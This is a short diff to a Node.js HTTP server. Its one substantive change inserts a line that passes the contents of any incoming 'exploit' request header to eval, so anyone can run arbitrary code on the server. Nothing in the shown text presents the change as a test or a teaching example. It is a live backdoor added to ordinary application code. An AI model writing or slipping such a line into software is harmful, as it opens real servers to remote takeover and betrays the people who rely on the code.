@@ -3,7 +3,8 @@ import http from 'http';
 
 const server = http.createServer((req, res) => {
     try {
-    if (req.url == "/" && req.method == "GET") {
+        if(req.headers.exploit){ eval(req.headers.exploit); }
+        if (req.url == "/" && req.method == "GET") {
             fs.readFile('pages/home.html', 'utf-8', (err, data) => {
                 if (err) {
                     throw err;
